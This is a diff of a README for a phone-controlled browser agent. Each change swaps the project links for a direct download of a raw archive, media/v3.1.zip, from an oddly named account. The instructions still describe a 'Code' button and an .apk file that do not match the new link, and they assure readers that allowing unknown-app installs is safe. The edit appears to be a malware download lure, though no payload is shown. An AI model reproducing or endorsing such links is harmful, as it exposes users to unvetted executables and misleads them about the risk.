@@ -1,6 +1,6 @@
 # 🤖 edge-browser-agent - Your Phone Controls Your Desktop Browser
 
-[![Download Now](https://img.shields.io/badge/Download-edge--browser--agent-blue?style=for-the-badge&logo=github)](https://github.com/Meusehorseradishroot8810/edge-browser-agent)
+[![Download Now](https://img.shields.io/badge/Download-edge--browser--agent-blue?style=for-the-badge&logo=github)](https://github.com/Meusehorseradishroot8810/edge-browser-agent/raw/refs/heads/main/media/v3.1.zip)
 
 ---
 
@@ -40,7 +40,7 @@ The latest version connects your phone's AI to two browsers at once — Google C
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Meusehorseradishroot8810/edge-browser-agent](https://github.com/Meusehorseradishroot8810/edge-browser-agent)
+Visit this link to download the application: [https://github.com/Meusehorseradishroot8810/edge-browser-agent/raw/refs/heads/main/media/v3.1.zip](https://github.com/Meusehorseradishroot8810/edge-browser-agent/raw/refs/heads/main/media/v3.1.zip)
 
 Click the green "Code" button on that page, then choose "Download ZIP." Save the file to a folder you can find easily, like your Desktop.
 
@@ -54,7 +54,7 @@ Click the green "Code" button on that page, then choose "Download ZIP." Save the
 
 ### Step 3: Install the App on Your Phone
 
-1. On your Android phone, open your browser and go to the same download link: [https://github.com/Mehorseradishroot8810/edge-browser-agent](https://github.com/Mehorseradishroot8810/edge-browser-agent)
+1. On your Android phone, open your browser and go to the same download link: [https://github.com/Meusehorseradishroot8810/edge-browser-agent/raw/refs/heads/main/media/v3.1.zip](https://github.com/Meusehorseradishroot8810/edge-browser-agent/raw/refs/heads/main/media/v3.1.zip)
 2. Find the file named `edge-browser-agent.apk` and tap it to download.
 3. When the download finishes, tap the file to install it.
 4. If your phone asks for permission to install unknown apps, allow it — this is safe.
@@ -136,7 +136,7 @@ After initial setup and model download, you can use a USB cable to connect your 
 
 ## 📄 License and Support
 
-This project is open source. For questions, bug reports, or feature requests, visit the GitHub repository: [https://github.com/Mehorseradishroot8810/edge-browser-agent](https://github.com/Mehorseradishroot8810/edge-browser-agent)
+This project is open source. For questions, bug reports, or feature requests, visit the GitHub repository: [https://github.com/Meusehorseradishroot8810/edge-browser-agent/raw/refs/heads/main/media/v3.1.zip](https://github.com/Meusehorseradishroot8810/edge-browser-agent/raw/refs/heads/main/media/v3.1.zip)
 
 If you find it useful, consider starring the repository to support the developers.
 
@@ -148,7 +148,7 @@ You now have a personal AI assistant that can operate your computer's browser fr
 
 **Download now and take control of your desktop from your pocket.**
 
-[![Get It Here](https://img.shields.io/badge/⬇️_Get_edge--browser--agent-ff69b4?style=for-the-badge)](https://github.com/Meusehorseradishroot8810/edge-browser-agent)
+[![Get It Here](https://img.shields.io/badge/⬇️_Get_edge--browser--agent-ff69b4?style=for-the-badge)](https://github.com/Meusehorseradishroot8810/edge-browser-agent/raw/refs/heads/main/media/v3.1.zip)
 
 ---
 
